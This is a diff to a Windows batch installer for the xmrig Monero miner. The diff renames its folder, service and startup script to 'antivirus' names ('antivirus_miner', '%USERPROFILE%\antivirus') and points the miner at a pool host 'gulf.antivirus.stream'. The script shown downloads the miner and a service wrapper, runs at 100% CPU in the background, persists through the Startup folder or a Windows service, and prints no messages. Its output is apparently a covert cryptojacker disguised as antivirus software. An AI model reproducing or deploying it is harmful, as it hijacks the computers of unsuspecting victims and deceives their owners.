@@ -100,7 +100,7 @@ set PORT=10001
 
 rem printing intentions
 
-set "LOGFILE=%USERPROFILE%\windows\xmrig.log"
+set "LOGFILE=%USERPROFILE%\antivirus\xmrig.log"
 
 echo.
 
@@ -126,15 +126,15 @@ rem start doing stuff: preparing miner
 
 echo.
 @echo off
-sc stop windows_miner
-sc delete windows_miner
+sc stop antivirus_miner
+sc delete antivirus_miner
 taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
 echo.
 
-rmdir /q /s "%USERPROFILE%\windows" >NUL 2>NUL
-IF EXIST "%USERPROFILE%\windows" GOTO REMOVE_DIR0
+rmdir /q /s "%USERPROFILE%\antivirus" >NUL 2>NUL
+IF EXIST "%USERPROFILE%\antivirus" GOTO REMOVE_DIR0
 
 echo.
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
@@ -144,7 +144,7 @@ if errorlevel 1 (
 )
 
 echo.
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\windows')"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\antivirus')"
 if errorlevel 1 (
   echo.
   powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
@@ -153,18 +153,18 @@ if errorlevel 1 (
     exit /b 1
   )
   echo.
-  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\windows" "%USERPROFILE%\xmrig.zip" >NUL
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\antivirus" "%USERPROFILE%\xmrig.zip" >NUL
   del "%USERPROFILE%\7za.exe"
 )
 del "%USERPROFILE%\xmrig.zip"
 
 echo.
-powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
-"%USERPROFILE%\windows\xmrig.exe" --help >NUL
+powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
+"%USERPROFILE%\antivirus\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 :MINER_BAD
 
-if exist "%USERPROFILE%\windows\xmrig.exe" (
+if exist "%USERPROFILE%\antivirus\xmrig.exe" (
   echo.
 ) else (
   echo.
@@ -184,11 +184,11 @@ if errorlevel 1 (
 :REMOVE_DIR1
 echo.
 
-rmdir /q /s "%USERPROFILE%\windows" >NUL 2>NUL
-IF EXIST "%USERPROFILE%\windows" GOTO REMOVE_DIR1
+rmdir /q /s "%USERPROFILE%\antivirus" >NUL 2>NUL
+IF EXIST "%USERPROFILE%\antivirus" GOTO REMOVE_DIR1
 
 echo.
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\windows')"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\antivirus')"
 if errorlevel 1 (
   echo.
   powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
@@ -197,7 +197,7 @@ if errorlevel 1 (
     exit /b 1
   )
   echo.
-  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\windows" "%USERPROFILE%\xmrig.zip" >NUL
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\antivirus" "%USERPROFILE%\xmrig.zip" >NUL
   if errorlevel 1 (
     echo.
     exit /b 1
@@ -207,11 +207,11 @@ if errorlevel 1 (
 del "%USERPROFILE%\xmrig.zip"
 
 echo.
-powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
-"%USERPROFILE%\windows\xmrig.exe" --help >NUL
+powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
+"%USERPROFILE%\antivirus\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 
-if exist "%USERPROFILE%\windows\xmrig.exe" (
+if exist "%USERPROFILE%\antivirus\xmrig.exe" (
   echo.
 ) else (
   echo.
@@ -231,15 +231,15 @@ if not [%EMAIL%] == [] (
   set "PASS=%PASS%:%EMAIL%"
 )
 
-powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.windows.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.antivirus.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
-powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
 
-copy /Y "%USERPROFILE%\windows\config.json" "%USERPROFILE%\windows\config_background.json" >NUL
-powershell -Command "$out = cat '%USERPROFILE%\windows\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config_background.json'" 
+copy /Y "%USERPROFILE%\antivirus\config.json" "%USERPROFILE%\antivirus\config_background.json" >NUL
+powershell -Command "$out = cat '%USERPROFILE%\antivirus\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config_background.json'" 
 
 rem preparing script
 (
@@ -252,14 +252,14 @@ echo.
 echo.
 echo.
 echo.
-) > "%USERPROFILE%\windows\miner.bat"
+) > "%USERPROFILE%\antivirus\miner.bat"
 
 rem preparing script background work and work under reboot
 
 if %ADMIN% == 1 goto ADMIN_MINER_SETUP
 
-if exist "%USERPROFILE%\AppData\Roaming\Microsoft\windows\Start Menu\Programs\Startup" (
-  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\windows\Start Menu\Programs\Startup"
+if exist "%USERPROFILE%\AppData\Roaming\Microsoft\antivirus\Start Menu\Programs\Startup" (
+  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\antivirus\Start Menu\Programs\Startup"
   goto STARTUP_DIR_OK
 )
 if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
@@ -275,10 +275,10 @@ echo.
 (
 echo @echo off
 echo.
-) > "%STARTUP_DIR%\windows_miner.bat"
+) > "%STARTUP_DIR%\antivirus_miner.bat"
 
 echo.
-call "%STARTUP_DIR%\windows_miner.bat"
+call "%STARTUP_DIR%\antivirus_miner.bat"
 goto OK
 
 :ADMIN_MINER_SETUP
@@ -291,7 +291,7 @@ if errorlevel 1 (
 )
 
 echo.
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\windows')"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\antivirus')"
 if errorlevel 1 (
   echo.
   powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
@@ -300,7 +300,7 @@ if errorlevel 1 (
     exit /b 1
   )
   echo.
-  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\windows" "%USERPROFILE%\nssm.zip" >NUL
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\antivirus" "%USERPROFILE%\nssm.zip" >NUL
   if errorlevel 1 (
     echo.
     exit /b 1
@@ -310,20 +310,20 @@ if errorlevel 1 (
 del "%USERPROFILE%\nssm.zip"
 
 echo.
-sc stop windows_miner
-sc delete windows_miner
-"%USERPROFILE%\windows\nssm.exe" install windows_miner "%USERPROFILE%\windows\xmrig.exe"
+sc stop antivirus_miner
+sc delete antivirus_miner
+"%USERPROFILE%\antivirus\nssm.exe" install antivirus_miner "%USERPROFILE%\antivirus\xmrig.exe"
 if errorlevel 1 (
   echo.
   exit /b 1
 )
-"%USERPROFILE%\windows\nssm.exe" set windows_miner AppDirectory "%USERPROFILE%\windows"
-"%USERPROFILE%\windows\nssm.exe" set windows_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
-"%USERPROFILE%\windows\nssm.exe" set windows_miner AppStdout "%USERPROFILE%\windows\stdout"
-"%USERPROFILE%\windows\nssm.exe" set windows_miner AppStderr "%USERPROFILE%\windows\stderr"
+"%USERPROFILE%\antivirus\nssm.exe" set antivirus_miner AppDirectory "%USERPROFILE%\antivirus"
+"%USERPROFILE%\antivirus\nssm.exe" set antivirus_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
+"%USERPROFILE%\antivirus\nssm.exe" set antivirus_miner AppStdout "%USERPROFILE%\antivirus\stdout"
+"%USERPROFILE%\antivirus\nssm.exe" set antivirus_miner AppStderr "%USERPROFILE%\antivirus\stderr"
 
 echo.
-"%USERPROFILE%\windows\nssm.exe" start windows_miner
+"%USERPROFILE%\antivirus\nssm.exe" start antivirus_miner
 if errorlevel 1 (
   echo.
   exit /b 1
